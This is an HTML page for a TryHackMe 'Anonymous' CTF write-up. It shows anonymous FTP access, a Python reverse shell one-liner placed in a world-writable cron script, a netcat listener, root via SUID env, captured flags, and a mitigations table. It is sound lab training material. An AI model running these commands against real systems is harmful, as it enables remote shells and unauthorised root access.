@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Anonymous — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A world-writable FTP scripts/ directory contained a cleanup script that runs on a schedule, plus a to-do note literally saying "I really need to disable…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/anonymous.html">
+<meta property="og:title" content="Anonymous — TryHackMe writeup">
+<meta property="og:description" content="A world-writable FTP scripts/ directory contained a cleanup script that runs on a schedule, plus a to-do note literally saying "I really need to disable…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/anonymous.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Anonymous — TryHackMe writeup","description":"A world-writable FTP scripts/ directory contained a cleanup script that runs on a schedule, plus a to-do note literally saying \"I really need to disable…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-24","url":"https://thecyberfarhan.github.io/writeups/anonymous.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/anonymous.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Anonymous</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 24, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>A world-writable FTP <code>scripts/</code> directory contained a cleanup script that runs on a schedule, plus a to-do note literally saying "I really need to disable the anonymous login." The cleanup script was overwritten via FTP with a Python reverse shell payload; the next scheduled run executed it, landing a shell as <code>namelessone</code>. SUID <code>/usr/bin/env</code> finished the job — a one-line GTFOBins escape to root. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">📂 FTP client</span><span class="chip">🐍 Python reverse shell one-liner</span><span class="chip">🐚 Netcat</span><span class="chip">🗂 smbclient</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Anonymous</strong> — a box that puts its own postmortem in writing before the engagement even starts. The <code>to_do.txt</code> file sitting in the FTP share is the sysadmin's own unaddressed risk assessment: anonymous FTP login is dangerous and needs disabling. It never got disabled. The writable <code>scripts/</code> directory paired with a periodically-executed cleanup script is a textbook "writable file in a privileged execution chain" vulnerability, very similar in spirit to the Startup box earlier in this series — except here the scheduling mechanism doesn't even need to be inferred, since the box explicitly shows the log file growing in real time between FTP checks.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What anonymous FTP write access enables when paired with a periodically-executed script</li><li>How <code>nano</code> or any text editor can be used to overwrite a script's contents while preserving its execution context</li><li>What SUID <code>env</code> allows via GTFOBins (<code>env &lt;interpreter&gt; &lt;flags&gt;</code>)</li><li>Basic <code>smbclient</code> usage for SMB share enumeration</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.48.171.146 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.3 — anonymous allowed; <code>scripts/</code> flagged <strong>writable</strong> by Nmap</td></tr><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td></tr><tr><td>139/tcp, 445/tcp</td><td>SMB</td><td>Samba smbd 4.7.6-Ubuntu</td></tr></tbody></table>
+<p>Nmap's <code>ftp-anon</code> script doesn't just confirm anonymous access — same as the Startup box — it flags the <code>scripts</code> subdirectory specifically as <code>[NSE: writeable]</code>. That detail alone defines the entire attack path before a single manual command is run.</p>
+<h3>Anonymous FTP</h3>
+<p>The FTP banner itself is a nice touch — *"NamelessOne's FTP Server!"* — directly naming the box's eventual user account before any enumeration even begins.</p>
+<pre><code>ftp 10.48.171.146
+# Name: anonymous
+ftp&gt; cd scripts
+ftp&gt; ls</code></pre>
+
+<pre><code>-rwxr-xrwx  clean.sh
+-rw-rw-r--  removed_files.log
+-rw-r--r--  to_do.txt</code></pre>
+<p class="aside">Downloading all three:</p>
+<pre><code>ftp&gt; get clean.sh
+ftp&gt; get removed_files.log
+ftp&gt; get to_do.txt</code></pre>
+<p class="aside"><code>clean.sh</code> contents:</p>
+<pre><code>#!/bin/bash
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+    echo "Running cleanup script: nothing to delete" &gt;&gt; /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE &amp;&amp; echo "$(date) | Removed file /tmp/$LINE" &gt;&gt; /var/ftp/scripts/removed_files.log
+    done
+fi</code></pre>
+<p>A cleanup script intended to delete temp files and log the activity — currently a no-op since <code>tmp_files</code> is hardcoded to <code>0</code>. The interesting part isn't the script's logic; it's that <code>removed_files.log</code> already contains over twenty identical "nothing to delete" entries — direct proof this script runs automatically and repeatedly, almost certainly via cron.</p>
+<p class="aside"><code>to_do.txt</code> contents:</p>
+<pre><code>I really need to disable the anonymous login...it's really not safe</code></pre>
+<p>The sysadmin's own words confirming the exact vulnerability being exploited.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>Writable Script Overwrite</h3>
+<p><strong>Why does this work?</strong> <code>clean.sh</code> is owned by a local user (uid 1000) but has world-write permission (<code>-rwxr-xrwx</code>), and it's confirmed to execute repeatedly via the growing log file. Since the script lives in an anonymously-writable FTP directory, overwriting its contents with arbitrary shell/Python code means that code runs under the script's owning account the next time the scheduler fires it — no exploit needed beyond an FTP <code>PUT</code>.</p>
+<p class="aside">Connecting and editing the script directly through the FTP-mounted path with <code>nano</code> (the file having been pulled locally for editing then re-uploaded, or edited via an FTP-aware editor):</p>
+<pre><code>nano clean.sh</code></pre>
+<p class="aside">Replacing the script body with a Python reverse shell one-liner:</p>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.217",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+<p class="aside">Re-uploading the modified script via FTP, then setting up the listener and waiting for the next scheduled execution:</p>
+<pre><code>nc -nvlp 4444</code></pre>
+
+<pre><code>connect to [192.168.134.217] from (UNKNOWN) [10.48.171.146] 36554</code></pre>
+<p class="aside">Stabilising:</p>
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<pre><code>namelessone@anonymous:~$ cat user.txt
+90d6f992585815ff991e68748c414740</code></pre>
+
+<h2 data-reveal>Shell / Access</h2>
+<p>Landed directly as <code>namelessone</code> — the named user the FTP banner all but introduced by name. No intermediate <code>www-data</code> hop was needed since the script executes under this user's own account via cron.</p>
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~15 mins into the box)</p>
+<h3>SUID env — GTFOBins</h3>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
+
+<pre><code>/usr/bin/env</code></pre>
+<p>Among the standard system SUID binaries, <code>/usr/bin/env</code> stands out.</p>
+<p><strong>Why is SUID <code>env</code> dangerous?</strong> <code>env</code> is designed to run a program in a modified environment — but it executes that program directly, inheriting whatever privileges the <code>env</code> binary itself has. With the SUID bit set, <code>env</code> runs with the file owner's privileges (root), and any program it launches inherits that same elevated privilege level.</p>
+<p class="aside">One command to root:</p>
+<pre><code>/usr/bin/env /bin/sh -p</code></pre>
+
+<pre><code># id
+uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=...,27(sudo),...
+# cat /root/root.txt
+4d930091c31a622a7ed10f27999af363</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Anonymous FTP</strong> with a writable <code>scripts/</code> directory and a script confirmed to run on a schedule</li><li><strong>Overwrote <code>clean.sh</code></strong> with a Python reverse shell payload via FTP</li><li><strong>Waited for the scheduled execution</strong> → shell as <code>namelessone</code> → user flag</li><li><strong>SUID <code>env</code></strong> → <code>env /bin/sh -p</code> → root shell → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>SMB Share Enumeration (For the Quiz Question, Not the Exploit Path)</h3>
+<p>The room's accompanying questions required identifying the SMB share name — a step entirely separate from the actual exploitation chain. <code>smbclient -L</code> against the host with a null session:</p>
+<pre><code>smbclient -L //10.48.171.146/ -N</code></pre>
+
+<pre><code>Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+pics            Disk      My SMB Share Directory for Pics
+IPC$            IPC       IPC Service</code></pre>
+<p>The <code>pics</code> share matches the <code>pics</code> directory later seen in <code>namelessone</code>'s home directory — confirming SMB and the local filesystem share the same content, though this connection wasn't load-bearing for the actual privilege escalation path.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Anonymous FTP login enabled</td><td class="sev-critical">Critical</td><td>Disable anonymous FTP entirely — the box's own <code>to_do.txt</code> correctly identifies this as the root issue</td></tr><tr><td>World-writable script in a scheduled execution chain</td><td class="sev-critical">Critical</td><td>Scripts executed by cron or any scheduler must be owned by root (or the minimum necessary user) with no group/world write access (<code>chmod 700</code>)</td></tr><tr><td>SUID bit set on <code>/usr/bin/env</code></td><td class="sev-critical">Critical</td><td>Remove the SUID bit from <code>env</code> — it has no legitimate administrative need for it; cross-reference all SUID binaries against GTFOBins</td></tr><tr><td>SMB shares accessible via null session</td><td class="sev-medium">Medium</td><td>Restrict guest/anonymous SMB access; require authentication for all shares</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>A growing log file with repeated identical entries is direct evidence of a scheduled task — and a writable script anywhere in that execution chain is a privilege escalation path regardless of whether <code>sudo -l</code> or SUID enumeration shows anything interesting at all. Always check what owns and triggers a script before assuming a quiet <code>sudo -l</code> output means there's no path forward.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Check <code>removed_files.log</code>'s timestamp pattern immediately to estimate the cron interval before uploading the payload — knowing roughly how long the wait will be (rather than discovering it passively) makes the difference between confidently waiting and repeatedly second-guessing whether the upload worked.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/anonymous_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
